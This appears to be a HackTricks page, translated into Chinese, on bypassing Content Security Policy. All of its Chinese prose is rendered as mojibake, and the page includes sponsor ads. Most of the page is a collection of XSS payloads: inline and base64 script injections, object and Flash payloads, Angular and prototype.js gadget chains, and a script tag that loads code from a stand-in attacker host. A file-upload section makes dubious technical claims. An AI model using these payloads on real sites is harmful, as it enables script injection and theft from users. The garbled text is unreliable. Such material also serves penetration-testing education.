# å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ç»•è¿‡

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**æ— éœ€ç­‰å¾…å³å¯è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´ç»è¿‡éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¥å­é‡ŒæŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°æœ›ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢è¡Œä¸ºä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

## ä»€ä¹ˆæ˜¯CSP

å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆContent Security Policyï¼ŒCSPï¼‰æ˜¯ä¸€ç§å†…ç½®çš„æµè§ˆå™¨æŠ€æœ¯ï¼Œ**æœ‰åŠ©äºé˜²æ­¢è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ç­‰æ”»å‡»**ã€‚å®ƒåˆ—å‡ºå¹¶æè¿°äº†æµè§ˆå™¨å¯ä»¥å®‰å…¨åŠ è½½èµ„æºçš„è·¯å¾„å’Œæ¥æºã€‚è¿™äº›èµ„æºå¯ä»¥åŒ…æ‹¬å›¾åƒã€æ¡†æ¶ã€JavaScriptç­‰ã€‚ä»¥ä¸‹æ˜¯å…è®¸ä»æœ¬åœ°åŸŸï¼ˆselfï¼‰åŠ è½½å’Œæ‰§è¡Œå†…è”èµ„æºä»¥åŠå…è®¸å­—ç¬¦ä¸²ä»£ç æ‰§è¡Œå‡½æ•°ï¼ˆå¦‚`eval`ã€`setTimeout`æˆ–`setInterval`ï¼‰çš„ç¤ºä¾‹ï¼š

å†…å®¹å®‰å…¨ç­–ç•¥é€šè¿‡**å“åº”å¤´**æˆ–**HTMLé¡µé¢çš„å…ƒç´ **å®ç°ã€‚æµè§ˆå™¨éµå¾ªæ¥æ”¶åˆ°çš„ç­–ç•¥ï¼Œå¹¶åœ¨æ£€æµ‹åˆ°è¿è§„æ—¶ä¸»åŠ¨é˜»æ­¢ã€‚

é€šè¿‡å“åº”å¤´å®ç°ï¼š
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
é€šè¿‡ meta æ ‡ç­¾å®ç°ï¼š
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

* `Content-Security-Policy`ï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰
* `Content-Security-Policy-Report-Only`ï¼ˆä»…æŠ¥å‘Šæ¨¡å¼ï¼Œä¸ä¼šé˜»æ­¢ä»»ä½•å†…å®¹ï¼Œä»…å‘é€æŠ¥å‘Šï¼Œç”¨äºé¢„å‘å¸ƒç¯å¢ƒï¼‰ã€‚

## å®šä¹‰èµ„æº

CSPé€šè¿‡é™åˆ¶å¯ä»¥åŠ è½½ä¸»åŠ¨å’Œè¢«åŠ¨å†…å®¹çš„æ¥æºæ¥å·¥ä½œã€‚å®ƒè¿˜å¯ä»¥é™åˆ¶ä¸»åŠ¨å†…å®¹çš„æŸäº›æ–¹é¢ï¼Œä¾‹å¦‚æ‰§è¡Œå†…è”JavaScriptå’Œä½¿ç”¨`eval()`å‡½æ•°ã€‚
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### æŒ‡ä»¤

* **script-src**: æ­¤æŒ‡ä»¤æŒ‡å®šäº†å…è®¸çš„ JavaScript èµ„æºæ¥æºã€‚è¿™ä¸ä»…åŒ…æ‹¬ç›´æ¥åŠ è½½åˆ°å…ƒç´ ä¸­çš„ URLï¼Œè¿˜åŒ…æ‹¬å¯ä»¥è§¦å‘è„šæœ¬æ‰§è¡Œçš„å†…è”è„šæœ¬äº‹ä»¶å¤„ç†ç¨‹åºï¼ˆä¾‹å¦‚ onclickï¼‰å’Œ XSLT æ ·å¼è¡¨ã€‚
* **default-src**: æ­¤æŒ‡ä»¤å®šä¹‰äº†é»˜è®¤æƒ…å†µä¸‹è·å–èµ„æºçš„ç­–ç•¥ã€‚å½“ CSP æ ‡å¤´ä¸­ç¼ºå°‘è·å–æŒ‡ä»¤æ—¶ï¼Œæµè§ˆå™¨é»˜è®¤éµå¾ªæ­¤æŒ‡ä»¤ã€‚
* **Child-src**: æ­¤æŒ‡ä»¤å®šä¹‰äº† Web Workers å’ŒåµŒå…¥å¼æ¡†æ¶å†…å®¹çš„å…è®¸èµ„æºã€‚
* **connect-src**: æ­¤æŒ‡ä»¤é™åˆ¶äº†ä½¿ç”¨ fetchã€websocketã€XMLHttpRequest ç­‰æ¥å£åŠ è½½çš„ URLã€‚
* **frame-src**: æ­¤æŒ‡ä»¤é™åˆ¶äº†å¯ä»¥è°ƒç”¨çš„æ¡†æ¶çš„ URLã€‚
* **frame-ancestors**: æ­¤æŒ‡ä»¤æŒ‡å®šå¯ä»¥åµŒå…¥å½“å‰é¡µé¢çš„æ¥æºã€‚æ­¤æŒ‡ä»¤é€‚ç”¨äº [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame)ã€[`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)ã€[`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object)ã€[`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed) æˆ– [`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet)ã€‚æ­¤æŒ‡ä»¤ä¸èƒ½åœ¨æ ‡ç­¾ä¸­ä½¿ç”¨ï¼Œä»…é€‚ç”¨äºé HTML èµ„æºã€‚
* **img-src**: å®ƒå®šä¹‰äº†å¯ä»¥åŠ è½½ç½‘é¡µä¸Šçš„å›¾åƒçš„æ¥æºã€‚
* **font-src:** æŒ‡ä»¤æŒ‡å®šäº†ä½¿ç”¨ `@font-face` åŠ è½½å­—ä½“çš„æœ‰æ•ˆæ¥æºã€‚
* **manifest-src**: æ­¤æŒ‡ä»¤å®šä¹‰äº†åº”ç”¨ç¨‹åºæ¸…å•æ–‡ä»¶çš„å…è®¸æ¥æºã€‚
* **media-src**: å®ƒå®šä¹‰äº†å¯ä»¥åŠ è½½åª’ä½“å¯¹è±¡çš„æ¥æºã€‚
* **object-src**: å®ƒå®šä¹‰äº† `<object>`ã€`<embed>` å’Œ `<applet>` å…ƒç´ çš„å…è®¸æ¥æºã€‚
* **base-uri**: å®ƒå®šä¹‰äº†å¯ä»¥ä½¿ç”¨å…ƒç´ åŠ è½½çš„ URLã€‚
* **form-action**: æ­¤æŒ‡ä»¤åˆ—å‡ºäº†æ ‡ç­¾æäº¤çš„æœ‰æ•ˆç«¯ç‚¹ã€‚
* **plugin-types**: å®ƒå®šä¹‰äº†é¡µé¢å¯ä»¥è°ƒç”¨çš„ MIME ç±»å‹çš„é™åˆ¶ã€‚
* **upgrade-insecure-requests**: æ­¤æŒ‡ä»¤æŒ‡ç¤ºæµè§ˆå™¨é‡å†™ URL æ–¹æ¡ˆï¼Œå°† HTTP æ”¹ä¸º HTTPSã€‚å¯¹äºéœ€è¦é‡å†™å¤§é‡æ—§ URL çš„ç½‘ç«™ï¼Œæ­¤æŒ‡ä»¤å¯èƒ½å¾ˆæœ‰ç”¨ã€‚
* **sandbox**: sandbox æŒ‡ä»¤ä¸ºè¯·æ±‚çš„èµ„æºå¯ç”¨äº†ç±»ä¼¼äº sandbox å±æ€§çš„æ²™ç®±ã€‚å®ƒå¯¹é¡µé¢çš„æ“ä½œæ–½åŠ äº†é™åˆ¶ï¼ŒåŒ…æ‹¬é˜»æ­¢å¼¹å‡ºçª—å£ã€é˜»æ­¢æ’ä»¶å’Œè„šæœ¬çš„æ‰§è¡Œï¼Œå¹¶å¼ºåˆ¶æ‰§è¡ŒåŒæºç­–ç•¥ã€‚

### **æ¥æº**

* \*: è¿™å…è®¸ä»»ä½• URLï¼Œä½†ä¸åŒ…æ‹¬ `data:`ã€`blob:`ã€`filesystem:` æ–¹æ¡ˆã€‚
* **self**: æ­¤æ¥æºå®šä¹‰äº†å…è®¸ä»åŒä¸€åŸŸåŠ è½½é¡µé¢ä¸Šçš„èµ„æºã€‚
* **data**: æ­¤æ¥æºå…è®¸é€šè¿‡ data æ–¹æ¡ˆåŠ è½½èµ„æºï¼ˆä¾‹å¦‚ Base64 ç¼–ç çš„å›¾åƒï¼‰ã€‚
* **none**: æ­¤æŒ‡ä»¤ä¸å…è®¸ä»ä»»ä½•æ¥æºåŠ è½½ä»»ä½•å†…å®¹ã€‚
* **unsafe-eval**: è¿™å…è®¸ä½¿ç”¨ eval() å’Œç±»ä¼¼çš„æ–¹æ³•ä»å­—ç¬¦ä¸²åˆ›å»ºä»£ç ã€‚å‡ºäºå®‰å…¨åŸå› ï¼Œä¸å»ºè®®åœ¨ä»»ä½•æŒ‡ä»¤ä¸­åŒ…å«æ­¤æ¥æºã€‚å› æ­¤ï¼Œå®ƒè¢«å‘½åä¸º unsafeã€‚
* **unsafe-hashes**: è¿™å…è®¸å¯ç”¨ç‰¹å®šçš„å†…è”äº‹ä»¶å¤„ç†ç¨‹åºã€‚
* **unsafe-inline**: è¿™å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œä¾‹å¦‚å†…è”å…ƒç´ ã€javascript: URLã€å†…è”äº‹ä»¶å¤„ç†ç¨‹åºå’Œå†…è”å…ƒç´ ã€‚å‡ºäºå®‰å…¨åŸå› ï¼Œä¸å»ºè®®ä½¿ç”¨æ­¤åŠŸèƒ½ã€‚
* **nonce**: ä½¿ç”¨åŠ å¯†çš„ nonceï¼ˆä¸€æ¬¡æ€§æ•°å­—ï¼‰ä¸ºç‰¹å®šçš„å†…è”è„šæœ¬è®¾ç½®ç™½åå•ã€‚æœåŠ¡å™¨å¿…é¡»æ¯æ¬¡ä¼ è¾“ç­–ç•¥æ—¶ç”Ÿæˆå”¯ä¸€çš„ nonce å€¼ã€‚
* **sha256-\<hash>**: ä¸ºå…·æœ‰ç‰¹å®š sha256 å“ˆå¸Œçš„è„šæœ¬è®¾ç½®ç™½åå•
* **strict-dynamic**: å®ƒå…è®¸æµè§ˆå™¨ä»å…ˆå‰ç”± "nonce" æˆ– "hash" å€¼åˆ—å…¥ç™½åå•çš„ä»»ä½•è„šæœ¬æ¥æºä¸­åŠ è½½å’Œæ‰§è¡Œæ–°çš„ JavaScript æ ‡ç­¾ã€‚
* **host**: æŒ‡ç¤ºä¸»æœºï¼Œä¾‹å¦‚ example.com

## ä¸å®‰å…¨çš„ CSP è§„åˆ™

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
å·¥ä½œè´Ÿè½½ï¼š`"/><script>alert(1);</script>`

#### é€šè¿‡ iframe å®ç° self + 'unsafe-inline'

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
æœ‰æ•ˆçš„è´Ÿè½½ï¼š
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

å¦‚æœä½ èƒ½ä»¥æŸç§æ–¹å¼ä½¿ä¸€ä¸ª**å…è®¸çš„JSä»£ç åˆ›å»ºä¸€ä¸ªæ–°çš„è„šæœ¬æ ‡ç­¾**åœ¨DOMä¸­ï¼Œå› ä¸ºæ˜¯ä¸€ä¸ªå…è®¸çš„è„šæœ¬åˆ›å»ºäº†å®ƒï¼Œ**æ–°çš„è„šæœ¬æ ‡ç­¾å°†è¢«å…è®¸æ‰§è¡Œ**ã€‚

### é€šé…ç¬¦ (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
æœ‰æ•ˆçš„è´Ÿè½½ï¼š
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### ç¼ºä¹ object-src å’Œ default-src

{% hint style="danger" %}
**çœ‹èµ·æ¥è¿™ä¸ªæ–¹æ³•å·²ç»ä¸å†æœ‰æ•ˆ**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
æœ‰æ•ˆçš„è´Ÿè½½ï¼š
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### æ–‡ä»¶ä¸Šä¼  + 'self'

#### ä»‹ç»

åœ¨Webåº”ç”¨ç¨‹åºä¸­ï¼Œå†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆContent Security Policyï¼ŒCSPï¼‰æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºé™åˆ¶æµè§ˆå™¨åŠ è½½å’Œæ‰§è¡Œçš„å†…å®¹ã€‚CSPé€šè¿‡æŒ‡å®šå…è®¸åŠ è½½çš„èµ„æºæºæ¥å‡å°‘è·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œæ•°æ®æ³„éœ²ç­‰å®‰å…¨é£é™©ã€‚

ç„¶è€Œï¼Œæœ‰æ—¶å€™æˆ‘ä»¬å¯èƒ½éœ€è¦ç»•è¿‡CSPé™åˆ¶ï¼Œä»¥ä¾¿ä¸Šä¼ æ¶æ„æ–‡ä»¶æˆ–æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚æœ¬æ–‡å°†ä»‹ç»ä¸€ç§ç»•è¿‡CSPé™åˆ¶çš„æŠ€æœ¯ï¼Œå³åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å’ŒCSPç­–ç•¥ä¸­çš„'self'å…³é”®å­—ã€‚

#### æ”»å‡»æ­¥éª¤

1. é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå…è®¸æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ã€‚è¿™å¯ä»¥æ˜¯ä¸€ä¸ªç”¨æˆ·å¤´åƒä¸Šä¼ ã€æ–‡ä»¶åˆ†äº«æˆ–å…¶ä»–å…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ã€‚

2. æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æ¶æ„ä»£ç ã€‚è¿™å¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«JavaScriptä»£ç çš„HTMLæ–‡ä»¶ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„å›¾ç‰‡æ–‡ä»¶ã€‚

3. åœ¨æ„é€ æ¶æ„æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š
   - æ–‡ä»¶æ‰©å±•åï¼šä¸ºäº†ç»•è¿‡CSPé™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›å¸¸è§çš„æ–‡ä»¶æ‰©å±•åï¼Œå¦‚.jpgã€.pngæˆ–.gifã€‚è¿™æ ·ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå°†æ–‡ä»¶ç±»å‹è¯†åˆ«ä¸ºå›¾ç‰‡ï¼Œè€Œä¸ä¼šå¯¹å…¶è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€æŸ¥ã€‚
   - æ–‡ä»¶å†…å®¹ï¼šæˆ‘ä»¬éœ€è¦åœ¨æ–‡ä»¶ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œä»¥ä¾¿åœ¨è¢«åŠ è½½æ—¶æ‰§è¡Œã€‚è¿™å¯ä»¥æ˜¯ä¸€æ®µJavaScriptä»£ç ï¼Œç”¨äºæ‰§è¡ŒXSSæ”»å‡»æˆ–å…¶ä»–æ¶æ„æ“ä½œã€‚

4. åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°†æ–‡ä»¶çš„Content-Typeè®¾ç½®ä¸º'image/*'ï¼Œä»¥ä¾¿ç»•è¿‡CSPç­–ç•¥ä¸­çš„'self'å…³é”®å­—ã€‚è¿™æ ·ï¼Œæµè§ˆå™¨å°†ä¼šè®¤ä¸ºè¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œè€Œä¸ä¼šå¯¹å…¶è¿›è¡ŒCSPé™åˆ¶ã€‚

5. ä¸€æ—¦æ–‡ä»¶ä¸Šä¼ æˆåŠŸå¹¶è¢«æœåŠ¡å™¨æ¥å—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®è¯¥æ–‡ä»¶çš„URLæ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚ç”±äºè¯¥æ–‡ä»¶è¢«æœåŠ¡å™¨è¯†åˆ«ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼Œæµè§ˆå™¨å°†ä¼šåŠ è½½å¹¶æ‰§è¡Œå…¶ä¸­çš„JavaScriptä»£ç ï¼Œä»è€Œç»•è¿‡CSPé™åˆ¶ã€‚

#### é˜²å¾¡æ–¹æ³•

è¦é˜²æ­¢æ–‡ä»¶ä¸Šä¼  + 'self'æ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

1. å¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„æ–‡ä»¶ç±»å‹æ£€æŸ¥å’ŒéªŒè¯ï¼Œç¡®ä¿åªå…è®¸ä¸Šä¼ å®‰å…¨çš„æ–‡ä»¶ç±»å‹ã€‚

2. åœ¨CSPç­–ç•¥ä¸­ï¼Œä¸è¦ä½¿ç”¨'self'å…³é”®å­—æ¥å…è®¸åŠ è½½æ‰€æœ‰æ¥è‡ªåŒä¸€åŸŸåçš„èµ„æºã€‚è€Œæ˜¯åº”è¯¥æ˜ç¡®æŒ‡å®šå…è®¸åŠ è½½çš„èµ„æºæºï¼Œä»¥å‡å°‘å®‰å…¨é£é™©ã€‚

3. å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå†…å®¹æ£€æŸ¥ï¼Œç¡®ä¿å…¶ä¸­ä¸åŒ…å«æ¶æ„ä»£ç ã€‚

4. å®šæœŸæ›´æ–°å’Œç»´æŠ¤Webåº”ç”¨ç¨‹åºçš„å®‰å…¨æœºåˆ¶ï¼Œä»¥åŠåŠæ—¶ä¿®å¤å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚

#### ç»“è®º

æ–‡ä»¶ä¸Šä¼  + 'self'æ”»å‡»æ˜¯ä¸€ç§ç»•è¿‡CSPé™åˆ¶çš„æŠ€æœ¯ï¼Œå¯ä»¥ç”¨äºä¸Šä¼ æ¶æ„æ–‡ä»¶æˆ–æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚ä¸ºäº†é˜²æ­¢æ­¤ç±»æ”»å‡»ï¼Œåº”è¯¥å¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œæ£€æŸ¥ï¼Œå¹¶é‡‡å–é€‚å½“çš„å®‰å…¨æªæ–½æ¥å‡å°‘å®‰å…¨é£é™©ã€‚
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
å¦‚æœä½ èƒ½ä¸Šä¼ ä¸€ä¸ªJSæ–‡ä»¶ï¼Œä½ å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªCSPï¼š

æœ‰æ•ˆè½½è·ï¼š
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
ç„¶è€Œï¼Œå¾ˆæœ‰å¯èƒ½æœåŠ¡å™¨æ­£åœ¨**éªŒè¯ä¸Šä¼ çš„æ–‡ä»¶**ï¼Œå¹¶ä¸”åªå…è®¸ä½ **ä¸Šä¼ ç‰¹å®šç±»å‹çš„æ–‡ä»¶**ã€‚

æ­¤å¤–ï¼Œå³ä½¿ä½ èƒ½å¤Ÿé€šè¿‡ä½¿ç”¨æœåŠ¡å™¨æ¥å—çš„æ‰©å±•åï¼ˆå¦‚_script.pngï¼‰åœ¨æ–‡ä»¶ä¸­ä¸Šä¼ **JSä»£ç **ï¼Œè¿™è¿˜ä¸å¤Ÿï¼Œå› ä¸ºä¸€äº›æœåŠ¡å™¨ï¼ˆå¦‚ApacheæœåŠ¡å™¨ï¼‰ä¼šæ ¹æ®æ‰©å±•å**é€‰æ‹©æ–‡ä»¶çš„MIMEç±»å‹**ï¼Œè€ŒåƒChromeè¿™æ ·çš„æµè§ˆå™¨ä¼š**æ‹’ç»æ‰§è¡Œåº”è¯¥æ˜¯å›¾åƒçš„ä¸œè¥¿ä¸­çš„Javascriptä»£ç **ã€‚"å¹¸è¿çš„æ˜¯"ï¼Œè¿™é‡Œå­˜åœ¨ä¸€äº›é”™è¯¯ã€‚ä¾‹å¦‚ï¼Œä»ä¸€ä¸ªCTFä¸­æˆ‘å­¦åˆ°ï¼Œ**Apacheä¸çŸ¥é“**.waveæ‰©å±•åï¼Œå› æ­¤å®ƒä¸ä¼šä½¿ç”¨ç±»ä¼¼audio/\*çš„**MIMEç±»å‹**æä¾›å®ƒã€‚

ä»è¿™é‡Œå¼€å§‹ï¼Œå¦‚æœä½ æ‰¾åˆ°äº†ä¸€ä¸ªXSSæ¼æ´å’Œä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¹¶ä¸”ä½ è®¾æ³•æ‰¾åˆ°äº†ä¸€ä¸ª**è¢«é”™è¯¯è§£é‡Šçš„æ‰©å±•å**ï¼Œä½ å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªå¸¦æœ‰è¯¥æ‰©å±•åå’Œè„šæœ¬å†…å®¹çš„æ–‡ä»¶ã€‚æˆ–è€…ï¼Œå¦‚æœæœåŠ¡å™¨æ­£åœ¨æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ­£ç¡®æ ¼å¼ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªå¤šè¯­è¨€æ–‡ä»¶ï¼ˆ[è¿™é‡Œæœ‰ä¸€äº›å¤šè¯­è¨€æ–‡ä»¶çš„ä¾‹å­](https://github.com/Polydet/polyglot-database)ï¼‰ã€‚

### ç¬¬ä¸‰æ–¹ç»ˆç«¯ç‚¹ + ('unsafe-eval')

{% hint style="warning" %}
å¯¹äºä»¥ä¸‹ä¸€äº›æœ‰æ•ˆè½½è·ï¼Œ**`unsafe-eval`ç”šè‡³éƒ½ä¸éœ€è¦**ã€‚
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
åŠ è½½ä¸€ä¸ªæœ‰æ¼æ´çš„Angularç‰ˆæœ¬å¹¶æ‰§è¡Œä»»æ„JSä»£ç ï¼š
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### ä½¿ç”¨Angular + ä¸€ä¸ªè¿”å›`window`å¯¹è±¡çš„å‡½æ•°åº“çš„æœ‰æ•ˆè½½è·ï¼ˆ[æŸ¥çœ‹æ­¤æ–‡ç« ](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)ï¼‰ï¼š

{% hint style="info" %}
è¯¥æ–‡ç« æ˜¾ç¤ºæ‚¨å¯ä»¥ä»`cdn.cloudflare.com`ï¼ˆæˆ–ä»»ä½•å…¶ä»–å…è®¸çš„JSåº“ä»“åº“ï¼‰**åŠ è½½**æ‰€æœ‰**åº“**ï¼Œæ‰§è¡Œæ¯ä¸ªåº“ä¸­æ·»åŠ çš„æ‰€æœ‰å‡½æ•°ï¼Œå¹¶æ£€æŸ¥**å“ªäº›å‡½æ•°ä»å“ªäº›åº“è¿”å›`window`å¯¹è±¡**ã€‚
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
#### æ»¥ç”¨è°·æ­ŒéªŒè¯ç JSä»£ç 

